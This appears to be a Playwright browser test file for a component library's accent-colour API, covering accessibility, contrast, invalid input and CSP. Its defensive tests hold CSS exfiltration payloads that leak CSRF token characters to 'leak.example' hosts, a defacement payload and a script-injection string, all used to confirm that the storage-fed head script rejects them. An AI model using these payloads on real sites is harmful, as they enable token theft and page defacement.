/**
 * Accent API (#41) in a browser: a custom accent on top of the standard themes keeps axe (serious and
 * critical) clean, keeps its contrast after a theme switch, survives invalid input, paints before
 * the first frame through the head script, works on a nested theme box and, as plain CSS
 * (`themes/accent.css`), keeps 4.5:1 for the text on the accent fill across the sRGB cube.
 * The pure colour math is tests/unit/accent.test.ts.
 */
import { expect, test, type Page } from '@playwright/test';
import { createAccentScript } from '../../src/lib/components/accent.js';
import { axeViolations } from './axe.js';

const ACCENTS: [string, string][] = [
	['yellow', '#ffe600'],
	['light pink', '#ffc8e6'],
	['dark blue', '#0a1a5c'],
	['grey', '#808080']
];
const THEMES = ['code', 'code-light', 'flower', 'pop-dark', 'line'];
const ALL_THEMES = ['code', 'code-light', 'code-paper', 'code-contrast', 'flower', 'flower-wald', 'pop', 'pop-dark', 'line', 'line-light'];
const PAGES = ['form', 'navigation', 'parity', 'feedback'];

/** Colour helpers in the page: any CSS colour to sRGB through a canvas, WCAG contrast. */
const HELPERS = String.raw`
window.__c = (() => {
	const ctx = document.createElement('canvas').getContext('2d', { willReadFrequently: true });
	const encode = (v) => Math.round(255 * Math.min(1, Math.max(0, v <= 0.0031308 ? 12.92 * v : 1.055 * v ** (1 / 2.4) - 0.055)));
	const rgb = (css) => {
		// canvas does not read color(xyz-d65 …), which is how the browser reports a relative colour in that space
		const xyz = /^color\(xyz-d65\s+([\d.e+-]+)\s+([\d.e+-]+)\s+([\d.e+-]+)\)$/.exec(css.trim());
		if (xyz) {
			const [x, y, z] = [Number(xyz[1]), Number(xyz[2]), Number(xyz[3])];
			return [
				encode(3.2404542 * x - 1.5371385 * y - 0.4985314 * z),
				encode(-0.969266 * x + 1.8760108 * y + 0.041556 * z),
				encode(0.0556434 * x - 0.2040259 * y + 1.0572252 * z)
			];
		}
		ctx.clearRect(0, 0, 1, 1);
		ctx.fillStyle = '#000';
		ctx.fillStyle = css;
		ctx.fillRect(0, 0, 1, 1);
		const d = ctx.getImageData(0, 0, 1, 1).data;
		return [d[0], d[1], d[2]];
	};
	const lum = ([r, g, b]) => {
		const f = (c) => { const s = c / 255; return s <= 0.04045 ? s / 12.92 : ((s + 0.055) / 1.055) ** 2.4; };
		return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
	};
	const contrast = (a, b) => {
		const [hi, lo] = [lum(rgb(a)), lum(rgb(b))].sort((x, y) => y - x);
		return (hi + 0.05) / (lo + 0.05);
	};
	return { rgb, contrast };
})();`;

declare global {
	interface Window {
		__c: { rgb(css: string): number[]; contrast(a: string, b: string): number };
	}
}

async function open(page: Page, name: string): Promise<void> {
	await page.emulateMedia({ reducedMotion: 'reduce' });
	await page.goto(`/tests/elements/pages/${name}.html`);
	await page.waitForFunction(() => !!window.kern?.accent);
	await page.addScriptTag({ content: HELPERS });
}

async function settle(page: Page): Promise<void> {
	await page.evaluate(async () => {
		await new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
		await Promise.all(document.getAnimations({ subtree: true }).map((a) => a.finished.catch(() => undefined)));
	});
	await page.waitForFunction(() =>
		[...document.querySelectorAll('*')]
			.filter((el) => el.tagName.startsWith('K-'))
			.every((el) => customElements.get(el.tagName.toLowerCase()) && el.shadowRoot)
	);
}

for (const page of PAGES) {
	for (const theme of THEMES) {
		for (const [name, hex] of ACCENTS) {
			test(`axe: ${page} page in ${theme} with the ${name} accent (${hex}) has no serious or critical violation`, async ({ page: p }) => {
				await open(p, page);
				await p.evaluate(
					([t, accent]) => {
						document.documentElement.dataset.theme = t;
						const result = window.kern?.accent.install(accent ?? '');
						if (!result?.ok) throw new Error('install failed');
					},
					[theme, hex]
				);
				await settle(p);
				expect(await p.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim())).toBe(hex);
				const findings = await axeViolations(p);
				expect(findings, JSON.stringify(findings, null, 2)).toEqual([]);
			});
		}
	}
}

test('control: the same pages do fail axe with a raw, unadjusted yellow, so the checks above can fail', async ({ page }) => {
	let failures = 0;
	for (const name of ['navigation', 'form', 'parity']) {
		await open(page, name);
		await page.evaluate(() => {
			document.documentElement.dataset.theme = 'flower';
			document.documentElement.style.cssText =
				'--k-primary:#ffe600;--k-accent-text:#ffe600;--k-focus:#ffe600;--k-accent-mark:#ffe600;--k-on-primary:#ffffff';
		});
		await settle(page);
		failures += (await axeViolations(page)).length;
	}
	expect(failures).toBeGreaterThan(0);
});

test.describe('on the accent page', () => {
	test('install keeps the contrast on every standard theme, also after a switch', async ({ page }) => {
		await open(page, 'accent');
		for (const [, hex] of ACCENTS) {
			await page.evaluate((accent) => window.kern?.accent.install(accent), hex);
			for (const theme of ALL_THEMES) {
				const bad = await page.evaluate((t) => {
					document.documentElement.dataset.theme = t;
					const css = getComputedStyle(document.documentElement);
					const v = (n: string): string => css.getPropertyValue(n).trim();
					const surfaces = [v('--k-bg'), v('--k-bg-raised'), v('--k-bg-sunken')];
					const c = window.__c.contrast;
					const out: string[] = [];
					const need = (label: string, ratio: number, min: number): void => {
						if (ratio < min) out.push(`${label} ${ratio.toFixed(2)} < ${min}`);
					};
					for (const s of surfaces) {
						need(`mark on ${s}`, c(v('--k-accent-mark'), s), 3);
						need(`focus on ${s}`, c(v('--k-focus'), s), 3);
						need(`text on ${s}`, c(v('--k-accent-text'), s), 4.5);
						need(`primary on ${s}`, c(v('--k-primary'), s), 4.5);
					}
					need('text on soft', c(v('--k-accent-text'), v('--k-accent-soft')), 4.5);
					need('on-primary', c(v('--k-on-primary'), v('--k-primary')), 4.5);
					need('on-primary-hover', c(v('--k-on-primary-hover'), v('--k-primary-hover')), 4.5);
					need('on-accent', c(v('--k-on-accent'), v('--k-accent')), 4.5);
					return out;
				}, theme);
				expect(bad, `${hex} on ${theme}`).toEqual([]);
			}
		}
	});

	test('the accent reaches the shadow DOM of the elements', async ({ page }) => {
		await open(page, 'accent');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c'));
		await settle(page);
		const fill = await page.evaluate(() => {
			const inner = document.querySelector('k-button[variant="accent"]')?.shadowRoot?.querySelector('button');
			return inner ? getComputedStyle(inner).backgroundColor : '';
		});
		expect(fill).toBe('rgb(233, 30, 140)');
	});

	test('invalid input changes nothing and does not throw', async ({ page }) => {
		const errors: string[] = [];
		page.on('pageerror', (e) => errors.push(e.message));
		await open(page, 'accent');
		const before = await page.evaluate(() => document.head.innerHTML);
		const out = await page.evaluate(() => {
			const a = window.kern?.accent;
			const bad = ['', 'pink', 'rgb(1,2,3)', '#12', '#ggg', '#ffffff80'];
			return {
				install: bad.map((v) => a?.install(v).ok),
				css: bad.map((v) => a?.css(v).ok),
				tokens: bad.map((v) => a?.tokens(v).ok),
				nullish: [a?.install(null as unknown as string).ok, a?.install(undefined as unknown as string).ok],
				theme: (() => {
					const r = a?.tokens('#e91e8c', { theme: 'nagellacke' });
					return r && !r.ok ? r.error.code : 'ok';
				})(),
				scoped: (() => {
					const el = document.getElementById('scope');
					const r = el && a?.apply(el, 'nope');
					return [r && r.ok, el?.getAttribute('style')];
				})()
			};
		});
		expect(out.install.every((ok) => ok === false)).toBe(true);
		expect(out.css.every((ok) => ok === false)).toBe(true);
		expect(out.tokens.every((ok) => ok === false)).toBe(true);
		expect(out.nullish).toEqual([false, false]);
		expect(out.theme).toBe('unknown-theme');
		expect(out.scoped).toEqual([false, null]);
		expect(await page.evaluate(() => document.head.innerHTML)).toBe(before);
		expect(await page.evaluate(() => document.getElementById('kern-accent'))).toBeNull();
		expect(errors).toEqual([]);
	});

	test('a bad accent after a good one leaves the good one in place; remove undoes it', async ({ page }) => {
		await open(page, 'accent');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c'));
		await page.evaluate(() => window.kern?.accent.install('nope'));
		expect(await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim())).toBe('#e91e8c');
		await page.evaluate(() => window.kern?.accent.install('#00aa55'));
		expect(await page.evaluate(() => document.querySelectorAll('style#kern-accent').length)).toBe(1);
		expect(await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim())).toBe('#00aa55');
		await page.evaluate(() => window.kern?.accent.remove());
		expect(await page.evaluate(() => document.getElementById('kern-accent'))).toBeNull();
		expect(await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim())).toBe('#d77b6f');
	});

	test('theme-color follows the accent on request and comes back on remove', async ({ page }) => {
		await open(page, 'accent');
		const meta = (): Promise<string | null> =>
			page.evaluate(() => document.querySelector('meta[name="theme-color"]')?.getAttribute('content') ?? null);
		expect(await meta()).toBe('#f6f0e0');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c', { themeColor: 'accent' }));
		expect(await meta()).toBe('#e91e8c');
		await page.evaluate(() => window.kern?.accent.install('#00aa55'));
		expect(await meta()).toBe('#f6f0e0');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c', { themeColor: 'accent' }));
		await page.evaluate(() => window.kern?.accent.remove());
		expect(await meta()).toBe('#f6f0e0');
	});

	test('storageKey stores the stylesheet and the head script paints it before any module runs', async ({ page }) => {
		await open(page, 'accent');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c', { storageKey: 'k-accent' }));
		const stored = await page.evaluate(() => localStorage.getItem('k-accent'));
		expect(stored).toContain("[data-theme='flower']");
		const script = createAccentScript('k-accent');
		await page.route('**/tests/elements/pages/accent.html', async (route) => {
			const response = await route.fetch();
			const html = (await response.text()).replace(
				'<head>',
				`<head><script>${script}</script><script>window.__early = { id: !!document.getElementById('kern-accent'), accent: getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim(), modules: !!customElements.get('k-button') }</script>`
			);
			await route.fulfill({ response, body: html });
		});
		await page.goto('/tests/elements/pages/accent.html');
		const early = await page.evaluate(() => (window as unknown as { __early: { id: boolean; accent: string; modules: boolean } }).__early);
		expect(early).toEqual({ id: true, accent: '#e91e8c', modules: false });
		await page.waitForFunction(() => !!window.kern?.accent);
		// the page's own install replaces the early style instead of adding a second one
		await page.evaluate(() => window.kern?.accent.install('#00aa55', { storageKey: 'k-accent' }));
		expect(await page.evaluate(() => document.querySelectorAll('style#kern-accent').length)).toBe(1);
	});

	test('the head script refuses the exfiltration and defacement payloads in the storage', async ({ page }) => {
		await open(page, 'accent');
		const payloads = [
			`input[name=csrf][value^='a']{background-image:image-set("http:a.leak.example" 1x)}`,
			`:root:has(input[value^='x']) body{cursor:-webkit-image-set("http:x.leak.example" 1x),auto}`,
			'body::before{content:"Session abgelaufen"}*{display:none}'
		];
		for (const payload of payloads) {
			await page.evaluate((css) => localStorage.setItem('k-accent', css), payload);
			await page.route('**/tests/elements/pages/accent.html', async (route) => {
				const response = await route.fetch();
				await route.fulfill({
					response,
					body: (await response.text()).replace('<head>', `<head><script>${createAccentScript('k-accent')}</script>`)
				});
			});
			await page.goto('/tests/elements/pages/accent.html');
			expect(await page.evaluate(() => document.getElementById('kern-accent'))).toBeNull();
			expect(await page.evaluate(() => getComputedStyle(document.body).display)).not.toBe('none');
			await page.unroute('**/tests/elements/pages/accent.html');
		}
	});

	test('under a strict style-src, installAccent needs the nonce and applyAccent works without one', async ({ page }) => {
		await page.route('**/tests/elements/pages/accent.html', async (route) => {
			const response = await route.fetch();
			await route.fulfill({
				response,
				headers: {
					...response.headers(),
					'content-security-policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'nonce-abc123'"
				}
			});
		});
		await page.goto('/tests/elements/pages/accent.html');
		await page.waitForFunction(() => !!window.kern?.accent);
		const accent = (): Promise<string> =>
			page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim());
		await page.evaluate(() => window.kern?.accent.install('#e91e8c'));
		expect(await accent()).toBe('#d77b6f');
		await page.evaluate(() => window.kern?.accent.install('#e91e8c', { nonce: 'abc123' }));
		expect(await accent()).toBe('#e91e8c');
		await page.evaluate(() => window.kern?.accent.remove());
		const inline = await page.evaluate(() => {
			const el = document.getElementById('scope');
			const r = el && window.kern?.accent.apply(el, '#e91e8c');
			return [r && r.ok, el && getComputedStyle(el).getPropertyValue('--k-primary').trim() !== ''];
		});
		expect(inline).toEqual([true, true]);
	});

	test('the head script ignores foreign content in the storage', async ({ page }) => {
		await open(page, 'accent');
		await page.evaluate(() => localStorage.setItem('k-accent', '</style><script>window.pwned = 1</script>'));
		await page.route('**/tests/elements/pages/accent.html', async (route) => {
			const response = await route.fetch();
			await route.fulfill({
				response,
				body: (await response.text()).replace('<head>', `<head><script>${createAccentScript('k-accent')}</script>`)
			});
		});
		await page.goto('/tests/elements/pages/accent.html');
		expect(await page.evaluate(() => document.getElementById('kern-accent'))).toBeNull();
		expect(await page.evaluate(() => (window as unknown as { pwned?: number }).pwned)).toBeUndefined();
	});

	test('apply sets tokens on one element for the theme it shows, also a nested one, and clear removes them', async ({ page }) => {
		await open(page, 'accent');
		const out = await page.evaluate(() => {
			const a = window.kern?.accent;
			const outer = document.getElementById('scope');
			const nested = document.getElementById('nested');
			if (!a || !outer || !nested) throw new Error('page not ready');
			const light = a.apply(outer, '#ffc8e6');
			const dark = a.apply(nested, '#ffc8e6');
			const c = window.__c.contrast;
			const v = (el: HTMLElement, n: string): string => getComputedStyle(el).getPropertyValue(n).trim();
			const result = {
				schemes: [light.ok && light.scheme, dark.ok && dark.scheme],
				lightPrimary: c(v(outer, '--k-primary'), v(outer, '--k-bg')),
				darkPrimary: c(v(nested, '--k-primary'), v(nested, '--k-bg')),
				rootUntouched: document.documentElement.getAttribute('style'),
				tokens: outer.style.length
			};
			a.clear(outer);
			a.clear(nested);
			return { ...result, afterClear: [outer.style.length, nested.style.length] };
		});
		expect(out.schemes).toEqual(['light', 'dark']);
		expect(out.lightPrimary).toBeGreaterThanOrEqual(4.5);
		expect(out.darkPrimary).toBeGreaterThanOrEqual(4.5);
		expect(out.rootUntouched).toBeNull();
		expect(out.tokens).toBeGreaterThan(5);
		expect(out.afterClear).toEqual([0, 0]);
	});

	test('apply reads the surfaces of a custom theme from its computed tokens', async ({ page }) => {
		await open(page, 'accent');
		const out = await page.evaluate(() => {
			const el = document.getElementById('scope');
			const a = window.kern?.accent;
			if (!el || !a) throw new Error('page not ready');
			el.removeAttribute('data-theme');
			el.setAttribute('data-theme', 'my-brand');
			el.style.setProperty('--k-bg', '#202040');
			el.style.setProperty('--k-bg-raised', 'rgb(40, 40, 80)');
			el.style.setProperty('--k-bg-sunken', '#181830');
			el.style.setProperty('--k-fg', '#ffffff');
			const r = a.apply(el, '#112266');
			const c = window.__c.contrast;
			return { ok: r.ok, scheme: r.ok && r.scheme, primary: c(getComputedStyle(el).getPropertyValue('--k-primary').trim(), '#202040') };
		});
		expect(out.ok).toBe(true);
		expect(out.scheme).toBe('dark');
		expect(out.primary).toBeGreaterThanOrEqual(4.5);
	});
});

test.describe('CSS only (themes/accent.css)', () => {
	test('sets the fill and an ink that reads on it, for the whole sRGB cube', async ({ page }) => {
		await open(page, 'accent');
		const worst = await page.evaluate(() => {
			const el = document.getElementById('fill');
			if (!el) throw new Error('no fill');
			el.setAttribute('data-k-accent', '');
			const c = window.__c.contrast;
			const steps = [0, 51, 102, 153, 204, 255];
			const colours: string[] = [];
			for (const r of steps) for (const g of steps) for (const b of steps) colours.push(`rgb(${r} ${g} ${b})`);
			for (let i = 0; i < 256; i += 3) colours.push(`rgb(${i} ${i} ${i})`);
			// hue and chroma sweep at the lightness where black and white are closest
			for (let h = 0; h < 360; h += 6) for (const l of [35, 45, 50, 55, 60, 65, 75]) colours.push(`hsl(${h} 100% ${l}%)`);
			let min = { ratio: 99, colour: '' };
			for (const colour of colours) {
				el.style.setProperty('--k-accent-color', colour);
				const style = getComputedStyle(el);
				const ratio = c(style.color, style.backgroundColor);
				if (ratio < min.ratio) min = { ratio, colour };
			}
			return { ...min, count: colours.length, bg: getComputedStyle(el).backgroundColor };
		});
		expect(worst.count).toBeGreaterThan(500);
		expect(worst.ratio, `worst: ${worst.colour}`).toBeGreaterThanOrEqual(4.5);
	});

	test('leaves the theme alone without data-k-accent and applies to a subtree with it', async ({ page }) => {
		await open(page, 'accent');
		const out = await page.evaluate(() => {
			const scope = document.getElementById('scope');
			if (!scope) throw new Error('no scope');
			const accent = (): string => getComputedStyle(scope).getPropertyValue('--k-accent').trim();
			const before = accent();
			scope.style.setProperty('--k-accent-color', '#e91e8c');
			const withoutAttribute = accent();
			scope.setAttribute('data-k-accent', '');
			return {
				before,
				withoutAttribute,
				withAttribute: accent(),
				root: getComputedStyle(document.documentElement).getPropertyValue('--k-accent').trim()
			};
		});
		expect(out.before).toBe('#d77b6f');
		expect(out.withoutAttribute).toBe('#d77b6f');
		expect(out.withAttribute).toBe('#e91e8c');
		expect(out.root).toBe('#d77b6f');
	});

	test('the accent Button takes the colour inside its shadow DOM', async ({ page }) => {
		await open(page, 'accent');
		await page.evaluate(() => {
			document.documentElement.setAttribute('data-k-accent', '');
			document.documentElement.style.setProperty('--k-accent-color', '#ffe600');
		});
		await settle(page);
		const [bg, fg] = await page.evaluate(() => {
			const inner = document.querySelector('k-button[variant="accent"]')?.shadowRoot?.querySelector('button');
			if (!inner) return ['', ''];
			const s = getComputedStyle(inner);
			return [s.backgroundColor, s.color];
		});
		expect(bg).toBe('rgb(255, 230, 0)');
		// yellow is light: black ink, whatever colour space the browser reports it in
		expect(await page.evaluate((ink) => window.__c.rgb(ink), fg)).toEqual([0, 0, 0]);
	});
});

test('elements/accent registers window.kern.accent and no tag', async ({ page }) => {
	await page.goto('/tests/elements/pages/entries.html');
	await page.addScriptTag({
		type: 'module',
		content:
			"import { accentTokens, installAccent } from '/dist-elements/elements/accent.js'; window.names = [typeof accentTokens, typeof installAccent]; window.loaded = true;"
	});
	await page.waitForFunction(() => (window as unknown as { loaded?: boolean }).loaded);
	expect(await page.evaluate(() => (window as unknown as { names: string[] }).names)).toEqual(['function', 'function']);
	expect(await page.evaluate(() => Object.keys(window.kern?.accent ?? {}).sort())).toEqual(
		['apply', 'clear', 'css', 'grounds', 'install', 'remove', 'script', 'tokenNames', 'tokens'].sort()
	);
	expect(await page.evaluate(() => !!customElements.get('k-button'))).toBe(false);
	expect(await page.evaluate(() => window.kern?.accent.tokens('#e91e8c', { theme: 'flower' }).ok)).toBe(true);
});

/**
 * An accent on a subtree (applyAccent sets the tokens inline on that element) reaches the parts that read the
 * accent colours, also through the component tokens of #38/#111: those resolve on the component, not on the
 * theme element (Input focus edge; the Code danger button, which hovers like a primary one).
 */
test.describe('accent on a subtree reaches the component tokens', () => {
	const PINK = 'rgb(233, 30, 140)';
	const DARK = 'rgb(10, 26, 92)';
	async function openAccented(page: Page, theme: string): Promise<void> {
		// no colour transitions: the computed colour is the end state at once
		await page.emulateMedia({ reducedMotion: 'reduce' });
		await page.goto(`/tests/elements/pages/visual.html?theme=${theme}`);
		await page.evaluate(() => customElements.whenDefined('k-input'));
		await page.evaluate(
			([pink, dark]) => {
				for (const s of ['input', 'button']) {
					const el = document.querySelector<HTMLElement>(`[data-shot="${s}"]`);
					el?.style.setProperty('--k-accent-mark', pink);
					el?.style.setProperty('--k-primary-hover', dark);
					el?.style.setProperty('--k-on-primary-hover', pink);
				}
			},
			[PINK, DARK]
		);
	}
	for (const theme of ['flower', 'line', 'code']) {
		test(`focus edge of k-input in ${theme}`, async ({ page }) => {
			await openAccented(page, theme);
			await page.locator('[data-shot="input"] k-input').first().locator('input').focus();
			const edge = await page
				.locator('[data-shot="input"] k-input')
				.first()
				.locator('.k-input')
				.evaluate((el) => getComputedStyle(el).borderTopColor);
			// Code keeps the field edge while focused (stuffcloud); every other theme shows the accent there
			if (theme === 'code') expect(edge).not.toBe(PINK);
			else expect(edge).toBe(PINK);
		});
	}
	test('danger hover in code follows the subtree primary hover', async ({ page }) => {
		await openAccented(page, 'code');
		const button = page.locator('[data-shot="button"] k-button[variant="danger"] button');
		await button.hover();
		// color-mix() reports in color(srgb …): 10, 26, 92 are 0.0392, 0.102, 0.361
		await expect
			.poll(() => button.evaluate((el) => getComputedStyle(el).backgroundColor))
			.toMatch(/^(rgb\(10, 26, 92\)|color\(srgb 0\.0392\d* 0\.10196\d* 0\.36078\d*\))$/);
	});
});
